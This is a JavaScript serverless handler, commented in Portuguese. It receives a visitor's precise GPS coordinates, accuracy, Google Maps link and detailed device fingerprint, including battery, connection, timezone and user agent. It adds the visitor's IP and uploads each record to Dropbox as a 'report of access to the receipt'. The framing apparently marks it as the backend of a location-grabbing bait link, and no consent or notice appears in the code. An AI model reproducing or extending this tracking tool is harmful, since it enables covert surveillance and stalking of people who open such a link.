import { Dropbox } from 'dropbox';

/**
 * Handler para salvar informações de acesso no Dropbox
 * @param {Object} req - Request object
 * @param {Object} res - Response object
 */
export default async function handler(req, res) {
    const origin = req.headers.origin;
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            error: 'Method not allowed'
        });
    }

    try {
        // Validar dados recebidos
        const validationError = validateRequestData(req.body);
        if (validationError) {
            return res.status(400).json({
                success: false,
                error: validationError
            });
        }

        const { lat, lng, precisao, googleMaps, dispositivo } = req.body;

        // Obter IP do usuário
        const ip = getClientIP(req);

        // Inicializar cliente Dropbox
        const dbx = new Dropbox({
            clientId: process.env.DROPBOX_APP_KEY,
            clientSecret: process.env.DROPBOX_APP_SECRET,
            refreshToken: process.env.DROPBOX_REFRESH_TOKEN
        });

        // Gerar conteúdo formatado
        const content = generateReportContent({
            lat,
            lng,
            precisao,
            googleMaps,
            dispositivo,
            ip
        });

        // Gerar nome do arquivo com IP
        const fileName = generateFileName(ip);

        // Upload para Dropbox
        await dbx.filesUpload({
            path: fileName,
            contents: content,
            mode: 'add',
            autorename: true
        });

        // Resposta de sucesso
        return res.status(200).json({
            success: true,
            message: 'Success'
        });

    } catch (error) {
        console.error('[API Error]', {
            message: error.message,
            stack: error.stack,
            timestamp: new Date().toISOString()
        });

        // Resposta de erro
        return res.status(500).json({
            success: false,
            error: 'Error processing request',
            details: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
}

/**
 * Valida os dados recebidos na requisição
 */
function validateRequestData(data) {
    if (!data) {
        return 'Data not provided';
    }

    const requiredFields = ['lat', 'lng', 'precisao', 'googleMaps', 'dispositivo'];

    for (const field of requiredFields) {
        if (!data[field]) {
            return `Missing required field: ${field}`;
        }
    }

    // Validar tipos
    if (typeof data.lat !== 'number' || typeof data.lng !== 'number') {
        return 'Invalid coordinates';
    }

    if (typeof data.dispositivo !== 'object') {
        return 'Invalid device information';
    }

    return null;
}

/**
 * Obtém o IP real do cliente
 */
function getClientIP(req) {
    const forwarded = req.headers['x-forwarded-for'];

    if (forwarded) {
        // Retorna o primeiro IP da lista
        return forwarded.split(',')[0].trim();
    }

    return req.connection?.remoteAddress ||
        req.socket?.remoteAddress ||
        'IP not available';
}

/**
 * Gera o conteúdo formatado do relatório
 */
function generateReportContent({ lat, lng, precisao, googleMaps, dispositivo, ip }) {
    const timestamp = new Date().toLocaleString('pt-BR', {
        timeZone: 'America/Sao_Paulo',
        dateStyle: 'full',
        timeStyle: 'long'
    });

    const batteryInfo = dispositivo.bateria || {};
    const batteryLevel = batteryInfo.nivel || 'N/D';
    const batteryCharging = batteryInfo.carregando ? 'Sim' : 'Não';

    return `
╔════════════════════════════════════════════════════════════════╗
║          RELATÓRIO DE ACESSO AO COMPROVANTE                    ║
╚════════════════════════════════════════════════════════════════╝

┌─ INFORMAÇÕES GERAIS ─────────────────────────────────────────┐
│ Data/Hora: ${timestamp}
│ IP Usuário: ${ip}
└──────────────────────────────────────────────────────────────┘

┌─ LOCALIZAÇÃO ────────────────────────────────────────────────┐
│ • Latitude:     ${lat}
│ • Longitude:    ${lng}
│ • Precisão:     ${precisao}
│ • Google Maps:  ${googleMaps}
└──────────────────────────────────────────────────────────────┘

┌─ DISPOSITIVO ────────────────────────────────────────────────┐
│ • Plataforma:   ${dispositivo.plataforma || 'N/D'}
│ • CPU Núcleos:  ${dispositivo.cpu || 'N/D'}
│ • Memória RAM:  ${dispositivo.memoria || 'N/D'}
│ • Resolução:    ${dispositivo.tela || 'N/D'}
└──────────────────────────────────────────────────────────────┘

┌─ SISTEMA E REDE ─────────────────────────────────────────────┐
│ • Bateria:      ${batteryLevel} (Carregando: ${batteryCharging})
│ • Conexão:      ${dispositivo.conexao || 'N/D'}
│ • Fuso Horário: ${dispositivo.fuso || 'N/D'}
└──────────────────────────────────────────────────────────────┘

┌─ USER AGENT ─────────────────────────────────────────────────┐
│ ${dispositivo.agente || 'N/D'}
└──────────────────────────────────────────────────────────────┘

────────────────────────────────────────────────────────────────
Fim do Registro
────────────────────────────────────────────────────────────────
`;
}

/**
 * Gera nome único para o arquivo incluindo IP
 */
function generateFileName(ip) {
    const timestamp = Date.now();
    // Sanitizar IP removendo caracteres inválidos para nome de arquivo
    const sanitizedIP = ip.replace(/[^a-zA-Z0-9.-]/g, '_');
    return `/report/${timestamp}_report_from_${sanitizedIP}.txt`;
}